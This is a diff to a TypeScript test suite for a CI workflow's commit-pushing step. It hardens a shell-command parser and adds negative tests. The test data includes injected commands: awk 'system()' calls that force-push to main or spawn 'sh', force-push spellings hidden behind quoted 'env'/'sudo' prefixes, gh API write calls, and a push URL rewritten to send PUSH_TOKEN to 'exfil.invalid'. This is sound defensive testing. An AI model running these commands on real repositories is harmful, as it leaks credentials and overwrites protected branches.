@@ -117,7 +117,7 @@ function runBodiesRaw(src: string): string[] {
 const runBodies = (src: string) => runBodiesRaw(src).map(withoutComments);
 
 /** One parsed command: its shell words, and the separator that PRECEDED it (`''` for the first). */
-type ShellCommand = { words: string[]; sep: string };
+type ShellCommand = { words: string[]; sep: string; end: string };
 
 /** The index of the `)` closing the `(` at `open`, quotes honoured. */
 function matchingParen(text: string, open: number): number {
@@ -164,7 +164,10 @@ function shellCommands(text: string): ShellCommand[] {
   };
   const endCommand = (next: string) => {
     endWord();
-    if (words.length) commands.push({ words, sep });
+    // `next` is the separator that ENDED this command, recorded on the command itself: a
+    // `case` arm pattern is syntactically "a command terminated by `)`", and that position is
+    // the only thing that tells `*)` apart from a program whose name happens to carry a glob.
+    if (words.length) commands.push({ words, sep, end: next });
     words = [];
     sep = next;
   };
@@ -253,13 +256,19 @@ function shellCommands(text: string): ShellCommand[] {
 }
 
 /**
- * Words that sit in FRONT of the program rather than being it: shell keywords, the builtins
- * that take a command as their argument, and `VAR=value`. Membership is decided by "does the
- * real program follow this word", not by "is this a keyword" - `command`, `env`, `time` and
- * `sudo` are none of them keywords, and leaving any one out makes every program-shaped sweep
- * in this file read the prefix as the program. `sudo` was the gap: `sudo git push --force`
- * put `sudo` in command position, so `gitPushes` found no push at all while the otherwise
- * identical `command git push --force` and `env git push --force` were both refused.
+ * Words that are never the PROGRAM of the command they head, so a sweep looking for a program
+ * must read past them: shell keywords, the builtins that take a command as their argument, and
+ * `VAR=value`. Two different reasons for membership, and they are not interchangeable - which
+ * is what `COMMAND_PREFIX` below separates out. `if`/`while`/`command`/`env`/`sudo`/`time` are
+ * followed by the real program; `for`/`local`/`in`/`case`/`exit`/`return` are followed by a
+ * variable, a word list or a status, so there is no program to find. What they share is only
+ * that reading the first word as the program is wrong in both cases.
+ *
+ * `command`, `env`, `time` and `sudo` are none of them keywords, and leaving any one out makes
+ * every program-shaped sweep in this file read the prefix as the program. `sudo` was the gap:
+ * `sudo git push --force` put `sudo` in command position, so `gitPushes` found no push at all
+ * while the otherwise identical `command git push --force` and `env git push --force` were both
+ * refused. `spellings` below carries both a bare and a quoted prefix so that stays falsified.
  */
 const SHELL_PREFIX =
   /^(if|then|elif|else|fi|for|while|until|do|done|case|esac|in|!|time|command|env|sudo|local|return|exit)$/;
@@ -286,7 +295,11 @@ const NON_COMMAND_HEAD = /^(fi|for|done|case|esac|in|local|return|exit)$/;
 const DATA_ONLY_COMMANDS =
   /^(git|gh|jq|echo|printf|cat|ls|diff|file|rm|mv|cp|mkdir|touch|sha256sum|cut|tr|head|tail|wc|sort|uniq|sed|grep|test|\[|\[\[|mktemp|date|basename|dirname|read|export|set|shift|unset|true|false|emit|count_since)$/;
 
-const unquoteWord = (word: string) => word.replace(/(^|[^\\])['"]/g, '$1');
+// Every quote character that is not itself escaped. Written as an alternation with `\\.` so
+// the escape is CONSUMED rather than used as a lookbehind: with `(^|[^\\])['"]` the character
+// before a quote was eaten by the match, so the second of two adjacent quotes could not match
+// and `''` unquoted to `'`.
+const unquoteWord = (word: string) => word.replace(/\\.|['"]/g, match => (match.length === 2 ? match : ''));
 
 /**
  * Tracked repo-root FILES by bare name, read from the index rather than listed here so the set
@@ -314,10 +327,22 @@ const referencesCheckout = (text: string) =>
   /GITHUB_WORKSPACE|RUNNER_TEMP/.test(text) ||
   rootTrackedFiles.has(text);
 
-/** A command's words with its leading `VAR=value` and shell-keyword prefixes dropped. */
+/**
+ * A command's words with its leading `VAR=value` and shell-keyword prefixes dropped.
+ *
+ * The prefix word is UNQUOTED before it is tested, because the tokenizer keeps quote characters
+ * and quoting a word changes nothing about what the shell runs. Testing the raw word here while
+ * `invokedPrograms` tested the normalized one made the two disagree in the quiet direction:
+ * `'env' git push --force origin HEAD:main` reported `'env'` as the program, so it entered
+ * neither `gitPushes` nor the staging pin nor `commandsNamed`, while the PROGRAMS set - which
+ * did normalize - still reported exactly `git` and stayed green. Every by-value bound on where
+ * a fold may push simply stopped being consulted, and nothing named an unknown program.
+ */
 function commandProgram(words: string[]): string[] {
   let rest = words;
-  while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || SHELL_PREFIX.test(rest[0]))) rest = rest.slice(1);
+  while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || SHELL_PREFIX.test(unquoteWord(rest[0])))) {
+    rest = rest.slice(1);
+  }
   return rest;
 }
 
@@ -396,7 +421,10 @@ function commandsNamed(src: string, name: RegExp): string[][] {
 }
 
 /**
- * Every distinct program a `run:` body invokes, sorted.
+ * Every distinct program a `run:` body invokes, sorted, split into the heads this parser can
+ * RESOLVE and the ones it cannot (a command head carrying a glob). Both halves are pinned by
+ * value at the call site; the second exists so an unresolvable head fails loudly instead of
+ * being dropped out of the first.
  *
  * Pinned as a whole SET at the call site for the reason `gitSubcommands` is: every bound in
  * this file is written in terms of the program it bounds, so an INDIRECTION reaches the bounded
@@ -407,8 +435,9 @@ function commandsNamed(src: string, name: RegExp): string[][] {
  * wrong side to enumerate; enumerating the programs this job runs means a new one has to be
  * justified here before it can be handed anything.
  */
-function invokedPrograms(src: string): string[] {
+function programHeads(src: string): { programs: string[]; globbed: string[] } {
   const names = new Set<string>();
+  const globbed = new Set<string>();
   for (const body of runBodies(src)) {
     for (const { words } of shellCommands(body)) {
       // Read the program THROUGH the prefix words, not as the command's first word. A prefix
@@ -417,27 +446,44 @@ function invokedPrograms(src: string): string[] {
       // by no assertion at all, and `if sh -c 'git apply --cached ...'` was green while the
       // bare `sh -c` form was refused. A keyword is never the answer to "what program runs".
       let rest = words;
+      let prefix = '';
       while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || COMMAND_PREFIX.test(unquoteWord(rest[0])))) {
+        prefix = unquoteWord(rest[0]);
         rest = rest.slice(1);
       }
-      const name = unquoteWord(rest[0] ?? '');
+      // A non-keyword prefix with NOTHING after it is itself the program - `env` alone prints
+      // the environment of the step it runs in. Stripping it left an empty vector, which the
+      // `continue` below then reported as no program at all.
+      const name = unquoteWord(rest[0] ?? '') || (/^(command|env|sudo|time)$/.test(prefix) ? prefix : '');
       // `for`/`local`/`exit` and friends head a command that contains no program, so the word
       // after them is a variable or a status and must not be reported as one.
       if (!name || NON_COMMAND_HEAD.test(name)) continue;
-      // Four shapes this parser reports in command position that are not programs, dropped so
+      // Three shapes this parser reports in command position that are not programs, dropped so
       // the pinned set stays readable rather than because they are safe: a redirection operand;
-      // a `case` arm pattern (`|` and `)` are command separators, so every arm parses as a
-      // command) and any other word carrying a glob character; an ALL-CAPS identifier, which is
-      // a shell VARIABLE reached through `$(( ))` arithmetic; and a bare integer, which falls
-      // out of the same arithmetic and of `awk`'s field references. Nothing an indirection
-      // would be spelled as is excluded - `sh`, `bash`, `xargs`, `eval`, `trap` and a `./path`
-      // are all still reported, which is what this set exists to refuse.
-      if (/^\d*[<>]/.test(name) || /[*?]/.test(name) || /^[A-Z_][A-Z0-9_]*$|^\d+$/.test(name)) continue;
+      // an ALL-CAPS identifier, which is a shell VARIABLE reached through `$(( ))` arithmetic;
+      // and a bare integer, which falls out of the same arithmetic and of `awk`'s field
+      // references. Nothing an indirection would be spelled as is excluded - `sh`, `bash`,
+      // `xargs`, `eval`, `trap` and a `./path` are all still reported, which is what this set
+      // exists to refuse.
+      if (/^\d*[<>]/.test(name) || /^[A-Z_][A-Z0-9_]*$|^\d+$/.test(name)) continue;
+      // A glob in command position is UNRESOLVABLE statically, so it is reported separately and
+      // pinned by value at the call site rather than dropped. Every one in the file today is a
+      // `case` arm pattern (`|` and `)` are command separators, so each arm parses as its own
+      // command), but "carries a glob" is not the same proposition as "is an arm pattern", and
+      // a silent `continue` on the first excluded the second: `ba?h -c 'git push --force origin
+      // HEAD:main'` named a program that the universal backstop below then never saw. Failing
+      // by value means a new unresolvable head is a deliberate edit, arm pattern or not.
+      if (/[*?]/.test(name)) {
+        globbed.add(name);
+        continue;
+      }
       names.add(name);
     }
   }
-  return [...names].sort();
+  return { programs: [...names].sort(), globbed: [...globbed].sort() };
 }
+
+const invokedPrograms = (src: string) => programHeads(src).programs;
 
 /**
  * The job-level `if:`, split into conjuncts. The step-scoped `ifConjuncts` cannot reach it -
@@ -503,9 +549,16 @@ function checkoutCodeReferences(src: string): string[] {
       [...text.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g)].some(m => tainted.has(m[1]));
     commands.forEach(({ words, sep }, index) => {
       let rest = words;
-      while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || SHELL_PREFIX.test(rest[0]))) {
-        const assignment = rest[0].match(/^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/);
-        if (assignment && referencesCheckout(unquoteWord(assignment[2]))) tainted.add(assignment[1]);
+      // Both tests read the UNQUOTED word, for the reason `commandProgram` does: the tokenizer
+      // keeps quote characters and quoting a prefix changes nothing about what runs, so
+      // `'sudo' bash ./scripts/x.sh` and `'S'=scripts/x.sh` would otherwise be a program named
+      // `'sudo'` and an assignment that taints nothing.
+      while (
+        rest.length &&
+        (/^[A-Za-z_][A-Za-z0-9_]*=/.test(unquoteWord(rest[0])) || SHELL_PREFIX.test(unquoteWord(rest[0])))
+      ) {
+        const assignment = unquoteWord(rest[0]).match(/^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/);
+        if (assignment && referencesCheckout(assignment[2])) tainted.add(assignment[1]);
         rest = rest.slice(1);
       }
       if (!rest.length) return;
@@ -953,6 +1006,15 @@ function runPushStep(src: string, fixture: PushFixture): PushOutcome {
 
     // The remote URL, and nothing else about the invocation. `for arg` iterates the argv
     // snapshot, so append-and-shift rotates the list exactly once.
+    //
+    // Any OTHER remote is refused rather than passed through. Redirecting only the github.com
+    // form left the harness bounding the refspec (`remoteRefs` below) while saying nothing
+    // about the DESTINATION: a body pushing to `https://x:${PUSH_TOKEN}@elsewhere.invalid/r`
+    // ran unredirected, so the fixture observed an untouched scratch remote and passed while
+    // the executed body had shipped the token off-box. Loud, not silent: a mutation that moves
+    // the destination now fails the run it is executed in. The scp-like arm keys on `@` before
+    // a `:`, which no argument in the shipped body carries - the commit trailer holds a URL but
+    // no `@`, and the identity `-c user.email=...` holds an `@` but no `:`.
     fs.writeFileSync(
       path.join(bin, 'git'),
       [
@@ -960,6 +1022,9 @@ function runPushStep(src: string, fixture: PushFixture): PushOutcome {
         'for arg; do',
         '  case "$arg" in',
         '    https://*github.com/*) set -- "$@" "$FOLD_TEST_REMOTE" ;;',
+        '    http://*|https://*|ssh://*|git://*|ftp://*|ftps://*|*@*:*)',
+        '      echo "fold-test: refusing a remote this harness does not redirect: $arg" >&2',
+        '      exit 97 ;;',
         '    *) set -- "$@" "$arg" ;;',
         '  esac',
         '  shift',
@@ -1848,21 +1913,93 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       ['awk', '-F\\t', '$1 == - { print $3 }', '$STAGED_NUMSTAT'],
       ['awk', '{ n += ($1 == - ? 0 : $1) + ($2 == - ? 0 : $2) } END { print n + 0 }'],
     ]);
+    // POSITIVE CONTROL for that pin, along its own axis: a by-value `toEqual` is only a bound
+    // if a THIRD invocation reaches it, and `awk` is reported as a program only when the
+    // prefix walk above reads past whatever heads it.
+    for (const injected of [
+      `awk 'BEGIN{ system("git push --force origin HEAD:main") }'`,
+      `sudo awk 'BEGIN{ system("id") }' /dev/null`,
+      `'env' awk 'BEGIN{ print | "sh" }' /dev/null`,
+    ]) {
+      const mutated = src.replace(
+        /^ {6}- name: Report skill-fetch failure$/m,
+        `      - name: Publish the fold\n        run: |\n          ${injected}\n      - name: Report skill-fetch failure`
+      );
+      expect(mutated, 'the injection anchor moved').not.toBe(src);
+      expect(commandsNamed(mutated, /^awk$/).length, `an awk program was not seen: ${injected}`).toBe(3);
+    }
+    // The other two entries whose argument can name or carry a program, pinned the same way.
+    // `jq -f <path>` runs a repo-tracked filter program, and `jq` is in `DATA_ONLY_COMMANDS`
+    // so the tree-execution sweep exempts it by name. `apt-get` runs arbitrary maintainer
+    // scripts as root; it is upstream of the agent, which is what makes the shipped pair safe
+    // rather than anything about the command, so a THIRD one has to be justified here.
+    // Quotes are stripped by the parser, so the program text is pinned as the shell passes
+    // it, and the redirection words are kept: a `2>` appearing where one did not is a change
+    // to where this command's output goes.
+    expect(commandsNamed(src, /^jq$/)).toEqual([
+      [
+        'jq',
+        '-s',
+        '-e',
+        'map(if type == array then .[] else . end)\n' +
+          '                       | any(.[]; (.message.content? // []) | any(.[]?; .type == tool_use and .name == ScheduleWakeup))',
+        '$DEST',
+        '>/dev/null',
+        '2>',
+      ],
+    ]);
+    expect(commandsNamed(src, /^apt-get$/)).toEqual([
+      ['apt-get', 'update'],
+      ['apt-get', 'install', '-y', 'bubblewrap'],
+    ]);
     // Every program any `run:` body invokes, as a whole SET. See `invokedPrograms`: the sweeps
     // in this file are each written in terms of the program they bound, so `sh -c 'git apply
     // --cached ...'`, `xargs git apply --cached` and `trap 'exit 0' ERR` reach what they bound
     // while naming none of it. A new entry here is a deliberate edit; `sh`, `bash`, `xargs`,
     // `eval`, `trap`, `curl` and `python` are not entries.
     expect(invokedPrograms(src)).toEqual(PROGRAMS);
+    // And every command head this parser cannot resolve, by value. All of them are `case` arm
+    // patterns in the push step's failure classifier; a globbed head anywhere else is an
+    // indirection the PROGRAMS set above cannot see, and it has to be justified here first.
+    expect(programHeads(src).globbed).toEqual([
+      '*',
+      '*403*',
+      '*[Pp]ermission*',
+      '*behind its remote*',
+      '*denied*',
+      '*fetch first*',
+      '*non-fast-forward*',
+      '*refusing to allow*',
+    ]);
     // `gh` is treated as data-only by the sweeps above because every call in the file reads.
     // It does not have to be: `GH_TOKEN="$PUSH_TOKEN" gh api --method PUT
     // repos/$REPO/contents/<path>` commits a file through the API, routing around the staging
     // sweep, the path guard, the size bound, the non-force and the refspec restriction at once.
     // Read calls only, so the sweeps' treatment of it stays true.
-    const ghWrites = commandsNamed(src, /^gh$/)
-      .filter(words => words.some(word => /^(-X|--method|--input|-f|-F|--field|--raw-field)$/.test(word)))
-      .map(words => words.join(' '));
-    expect(ghWrites).toEqual([]);
+    // `(=|$)`, not `$`: `gh` accepts `--method=PUT` as readily as `--method PUT`, and this
+    // file's own `takesValue` logic already treats `--opt=value` as a spelling of the flag, so
+    // the anchored form made the asymmetry internal to this file rather than a limit of `gh`.
+    const ghWrites = (text: string) =>
+      commandsNamed(text, /^gh$/)
+        .filter(words => words.some(word => /^(-X|--method|--input|-f|-F|--field|--raw-field)(=|$)/.test(word)))
+        .map(words => words.join(' '));
+    expect(ghWrites(src)).toEqual([]);
+    // POSITIVE CONTROL, along that axis. Every `=`-spelled entry carries NO space-spelled flag:
+    // with `--method=PUT ... -f content=y` the `-f` matches the anchored form too, so the
+    // control passed against the defect it was written for and proved nothing.
+    for (const spelling of [
+      'gh api --method PUT repos/$REPO/contents/x -f content=y',
+      'gh api --method=PUT repos/$REPO/contents/x --field=content=y',
+      'gh api --raw-field=content=y repos/$REPO/contents/x',
+      "'env' gh api --input=- repos/$REPO/contents/x",
+    ]) {
+      const mutated = src.replace(
+        /^ {6}- name: Report skill-fetch failure$/m,
+        `      - name: Publish the fold\n        run: |\n          ${spelling}\n      - name: Report skill-fetch failure`
+      );
+      expect(mutated, 'the injection anchor moved').not.toBe(src);
+      expect(ghWrites(mutated), `a gh write was not seen: ${spelling}`).toHaveLength(1);
+    }
     // And no `gh` at all in the step that holds PUSH_TOKEN.
     expect(commandsNamed(step(src, 'Push fold commit'), /^gh$/)).toEqual([]);
     // The step must fail rather than fall through: without `-e` a failed `git commit`
@@ -2143,6 +2280,18 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     for (const [label, outcome] of Object.entries({ edited, ciConfig, untouched, oversized, raced })) {
       expect(outcome.remoteRefs, label).toEqual([`refs/heads/${PUSH_HEAD_REF}`]);
     }
+
+    // And the DESTINATION, which bounding the ref does not bound: `remoteRefs` reads the
+    // scratch remote, so a body pointed at another host leaves it untouched and every
+    // assertion above passes while the executed body ships PUSH_TOKEN off-box. Fed a mutated
+    // `src` rather than injected into the workflow, because the by-value pin on `gitPushes`
+    // catches that mutation first and would mask which assertion is doing the work here.
+    const exfil = runPushStep(src.replace('@github.com/${REPO}.git', '@exfil.invalid/${REPO}.git'), {
+      edits: [{ path: 'src/a.ts', lines: 4 }],
+    });
+    expect(exfil.status, exfil.out).not.toBe(0);
+    expect(exfil.out).toContain('refusing a remote this harness does not redirect');
+    expect(exfil.remoteLog).toEqual(['base']);
   });
 
   it('pushes non-force to the PR head ref, with a token the checkout never held', () => {
@@ -2200,12 +2349,24 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // each of those is a real step to a YAML parser, and prettier returns every one of them
     // byte-identical. COMMAND SPELLING: `git -c <key>=<value> push` is this job's own house
     // style, and two spaces or a line continuation between `git` and `push` are the same
-    // command to the shell and a different string to a matcher.
+    // command to the shell and a different string to a matcher. COMMAND PREFIX:
+    // `sudo`/`env`/`command`/`time` and a `VAR=value` assignment all sit in front of the
+    // program without being it, and quoting one changes nothing about what the shell runs -
+    // `'env' git push` was green against every by-value bound in this file while the PROGRAMS
+    // set, which normalized, still reported exactly `git`. Each entry below falsifies a
+    // different half of that: without `sudo` in `SHELL_PREFIX` the bare form escapes, and
+    // without `unquoteWord` in `commandProgram` the quoted form does. Note the deliberate
+    // absence of a URL - a URL-bearing push trips `checkoutCodeReferences` instead, so a
+    // mutation spelled that way reds a DIFFERENT assertion and proves nothing about this one.
     const spellings = [
       'git push --force "https://x-access-token:${PUSH_TOKEN}@github.com/${REPO}.git" HEAD:refs/heads/main',
       'git -c http.version=HTTP/1.1 push --force origin HEAD:main',
       'git  push --force origin HEAD:main',
       'git \\\n            push --force origin HEAD:main',
+      'sudo git push --force origin HEAD:main',
+      "'env' git push --force origin HEAD:main",
+      '"command" git push --force origin HEAD:main',
+      "GIT_TERMINAL_PROMPT=0 'time' git push --force origin HEAD:main",
     ];
     const shapes = [
       (body: string) => `      - name: Publish the fold\n        run: |\n          ${body}`,
